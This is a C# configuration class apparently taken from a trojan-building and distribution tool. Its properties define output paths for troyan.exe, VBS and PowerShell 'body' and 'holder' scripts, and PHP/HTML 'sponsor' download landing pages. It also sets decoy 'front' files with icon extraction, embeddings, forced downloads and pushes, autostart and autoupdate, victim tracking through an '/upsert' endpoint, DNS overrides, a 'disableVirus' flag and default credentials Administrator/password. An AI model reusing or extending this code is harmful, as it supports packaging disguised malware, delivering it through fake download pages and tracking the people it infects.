using System.Text.Json.Serialization;

namespace model;

public class ServerModel
{
    [JsonPropertyName("urlDoc")] public string UrlDoc { get; set; } = "";
    
    [JsonPropertyName("disabled")] public bool Disabled { get; set; } = false;
        
    [JsonPropertyName("disableVirus")] public bool DisableVirus { get; set; } = false;
        
    [JsonPropertyName("tabs"), JsonIgnore]
    public List<TabModel> Tabs { get; set; }
        
    [JsonPropertyName("bux")]
    public List<BuxModel> Bux { get; set; }
        
    [JsonPropertyName("dnSponsor")]
    public List<DnSponsorModel> DnSponsor { get; set; }
        
    private string _landingName;
        
    [JsonPropertyName("landingAuto")]
    public bool LandingAuto { get; set; }

    [JsonPropertyName("landingName")]
    public string LandingName
    {
        get
        {
            if (string.IsNullOrEmpty(_landingName))
                _landingName = "default";
            return _landingName;
        }
        set { _landingName = value; }
    }
        
    [JsonPropertyName("landingFtp")]
    public string LandingFtp { get; set; }
       
    [JsonPropertyName("sourceCertDir")] public string SourceCertDir => ServerModelLoader.SourceCertDirStatic;
    // statics
    [JsonPropertyName("rootDir")] public string RootDir => ServerModelLoader.RootDirStatic;
    

    [JsonPropertyName("cpDir")] public string CpDir => ServerModelLoader.CpDirStatic;
    [JsonPropertyName("certDir")] public string CertDir => ServerModelLoader.CertDirStatic;
    [JsonPropertyName("phpDir")] public string PhpDir => ServerModelLoader.PhpDirStatic;
    [JsonPropertyName("phpTemplateFile")] public string PhpTemplateFile => Path.Join(PhpDir, ".\\dn.php");
    [JsonPropertyName("phpTemplateSponsorFile")] public string PhpTemplateSponsorFile => Path.Join(PhpDir, ".\\download.php");
    [JsonPropertyName("htmlTemplateSponsorFile")] public string HtmlTemplateSponsorFile => Path.Join(PhpDir, ".\\download.html");
    [JsonPropertyName("sysDir")] public string SysDir => ServerModelLoader.SysDirStatic;
        
    public string UpdateFile  { get; set; }
        
    [JsonPropertyName("troyanDir")] public string TroyanDir => ServerModelLoader.TroyanDirStatic;
    [JsonPropertyName("troyanScriptDir")] public string TroyanScriptDir => ServerModelLoader.TroyanScriptDirStatic;
    [JsonPropertyName("troyanOutputDir")] public string TroyanOutputDir => Path.Join(TroyanDir, @".\_output");
    [JsonPropertyName("troyanExe")] public string TroyanExe => Path.Join(TroyanOutputDir, "troyan.exe");
    [JsonPropertyName("troyanIco")] public string TroyanIco => Path.Join(TroyanOutputDir, "troyan.ico");

    [JsonPropertyName("body")] public string Body=> Path.Join(TroyanOutputDir, "body.txt");
    [JsonPropertyName("bodyRelease")] public string BodyRelease => Path.Join(TroyanOutputDir, "body.release.ps1");
    [JsonPropertyName("bodyDebug")] public string BodyDebug => Path.Join(TroyanOutputDir, "body.debug.ps1");
    
    [JsonPropertyName("holder")] public string Holder => Path.Join(TroyanOutputDir, "holder.txt");
    [JsonPropertyName("holderRelease")] public string HolderRelease => Path.Join(TroyanOutputDir, "holder.release.ps1");
    [JsonPropertyName("holderDebug")] public string HolderDebug => Path.Join(TroyanOutputDir, "holder.debug.ps1");
    
        
    [JsonPropertyName("userTroyanExe")] public string UserTroyanExe => Path.Join(UserDataDir, "troyan.exe");
    [JsonPropertyName("userTroyanIco")] public string UserTroyanIco => Path.Join(UserDataDir, "troyan.ico");
    
    [JsonPropertyName("troyanVbsDir")] public string TroyanVbsDir => ServerModelLoader.TroyanVbsDirStatic;
    [JsonPropertyName("troyanVbsFile")] public string TroyanVbsFile => Path.Join(TroyanOutputDir, "troyan.vbs");
    [JsonPropertyName("userVbsFile")] public string UserVbsFile => Path.Join(UserDataDir, "troyan.vbs");
    [JsonPropertyName("userVbsFileClean")] public string UserVbsFileClean => Path.Join(UserDataDir, "troyan.c.vbs");
        
    [JsonPropertyName("defaultIco")] public string DefaultIco => Path.Join(RootDir, "defaulticon.ico");
        
        

    // server-depended
    [JsonPropertyName("server")] public string Server { get; set; }
    [JsonPropertyName("alias")] public string Alias { get; set; }
        
    [JsonPropertyName("strahServer")] public string StrahServer { get; set; }
    [JsonPropertyName("userDataDir")] public string UserDataDir => @$"C:\data\{Server}";
    [JsonPropertyName("userServerFile")] public string UserServerFile => Path.Combine(UserDataDir, "server.json");


        
    public string Random()
    {
        return VbsRandomer.GenerateRandomVariableName(10);
    }
        
    [JsonPropertyName("dnVbsLinkShort")] public string DnVbsLinkShort => $"/default/{Random()}/none/GetVbs";
    [JsonPropertyName("dnVbsLink")] public string DnVbsLink => $"http://{Alias}/{DnVbsLinkShort}";
    [JsonPropertyName("phpVbsLinkShort")] public string PhpVbsLinkShort => $"/default/GetVbsPhp";
       
        
    [JsonPropertyName("userPhpVbsFile")] public string UserPhpVbsFile => Path.Join(UserDataDir, $"{DownloadIdentifier}.php");
    [JsonPropertyName("userSponsorPhpVbsFile")] public string UserSponsorPhpVbsFile => Path.Join(UserDataDir, $"{DownloadIdentifier}-sponsor.php");
    [JsonPropertyName("userSponsorHtmlVbsFile")] public string UserSponsorHtmlVbsFile => Path.Join(UserDataDir, $"{DownloadIdentifier}-sponsor.html");
    
    [JsonPropertyName("userPhpExeFile")] public string UserPhpExeFile => Path.Join(UserDataDir, $"{DownloadIdentifier}-exe.php");
    [JsonPropertyName("userSponsorPhpExeFile")] public string UserSponsorPhpExeFile => Path.Join(UserDataDir, $"{DownloadIdentifier}-sponsor-exe.php");
    [JsonPropertyName("userSponsorHtmlExeFile")] public string UserSponsorHtmlExeFile => Path.Join(UserDataDir, $"{DownloadIdentifier}-sponsor-exe.html");

    [JsonPropertyName("downloadIdentifier")]
    public string DownloadIdentifier
    {
        get
        {
            if (!string.IsNullOrEmpty(LandingName))
                return LandingName;
            return "download";
        }
    }
    
        
    //Update
    [JsonPropertyName("updateUrl")]
    public string UpdateUrl 
    { 
        get
        {
            var result = "http://";
            if (!string.IsNullOrEmpty(Alias))
                result += Alias;
            else
            {
                result += Server;
            }
            result += "/update";
            return result;
        }
    }
        
    //Update
    [JsonPropertyName("updateUrlFolder")]
    public string UpdateUrlFolder 
    { 
        get
        {
            var result = "http://";
            if (!string.IsNullOrEmpty(Alias))
                result += Alias;
            else
            {
                result += Server;
            }
            result += $"/data/";
            return result;
        }
    }
        
    //Update
    [JsonPropertyName("updateUrlBlock")]
    public string UpdateUrlMono
    { 
        get
        {
            return UpdateUrlFolder + "block/";
        }
    }

    // properties
    [JsonPropertyName("login")] public string Login { get; set; }

    [JsonPropertyName("password")] public string Password { get; set; }

    [JsonPropertyName("primaryDns")] public string PrimaryDns { get; set; }

    [JsonPropertyName("secondaryDns")] public string SecondaryDns { get; set; }

    [JsonPropertyName("track")] public bool Track { get; set; }

    [JsonPropertyName("trackSerie")] public string TrackSerie { get; set; }
        
    [JsonPropertyName("trackDesktop")] public bool TrackDesktop { get; set; }

    [JsonPropertyName("trackUrl")]
    public string TrackUrl
    {
        get
        {
            var result = "http://";
            if (!string.IsNullOrEmpty(Alias))
            {
                result += Alias;
            }
            else
            {
                result += Server;
            }
            result += "/upsert";
            return result;
        }
    }
        
    [JsonPropertyName("autoStart")] public bool AutoStart { get; set; }

    [JsonPropertyName("autoUpdate")] public bool AutoUpdate { get; set; }

    public List<string> Domains(string name) => DomainIps.Where(a=> a.Name == name).SelectMany(a=>a.Domains).ToList();

    public List<string> AllDomains() => DomainIps.SelectMany(a=>a.Domains).ToList();
    
    [JsonPropertyName("interfaces")] public List<string> Interfaces { get; set; }

    [JsonPropertyName("domainIps")] public List<DomainIp> DomainIps { get; set; }
    
    [JsonPropertyName("pushesForce")] public bool PushesForce { get; set; } = true;
    [JsonPropertyName("pushes")] public List<string> Pushes { get; set; }
        
    [JsonPropertyName("startDownloadsForce")] public bool StartDownloadsForce { get; set; }
    [JsonPropertyName("startDownloads")] public List<string> StartDownloads { get; set; }

    [JsonPropertyName("startUrlsForce")] public bool StartUrlsForce { get; set; }
    [JsonPropertyName("startUrls")] public List<string> StartUrls { get; set; }

    [JsonPropertyName("frontForce")] public bool FrontForce { get; set; }
    [JsonPropertyName("front")] public List<string> Front { get; set; }

    [JsonPropertyName("extractIconFromFront")]
    public bool ExtractIconFromFront { get; set; }

    [JsonPropertyName("embeddingsForce")] public bool EmbeddingsForce { get; set; }
    [JsonPropertyName("embeddings")] public List<string> Embeddings { get; set; }


    //resulting
    [JsonPropertyName("adminServers")]
    [JsonIgnore]
    public Dictionary<string, string>? AdminServers { get; set; }

    [JsonPropertyName("adminPassword")]
    [JsonIgnore]
    public string AdminPassword { get; set; }

    [JsonIgnore] public string? Result { get; set; }

    [JsonPropertyName("isValid")] public bool IsValid { get; set; }
        
    [JsonPropertyName("extraUpdate")] public bool ExtraUpdate { get; set; }
    [JsonPropertyName("extraUpdateUrl")] public string ExtraUpdateUrl { get; set; }

    [JsonIgnore] public bool IsLocal => Server == "127.0.0.1";
    
    //constructor
    public ServerModel()
    {
        IsValid = false;
        Server = "1.1.1.1";
        Login = "Administrator";
        Password = "password";
        Track = false;
        AutoStart = false;
        AutoUpdate = false;
        StartUrls = new List<string>();
        StartDownloads = new List<string>();
        Interfaces = new List<string>();
        Pushes = new List<string>();
        DomainIps = new();
        Front = new List<string>();
        ExtractIconFromFront = false;
        Embeddings = new List<string>();
        Tabs = new List<TabModel>();
        Bux = new List<BuxModel>();
        DnSponsor = new List<DnSponsorModel>();
    }
}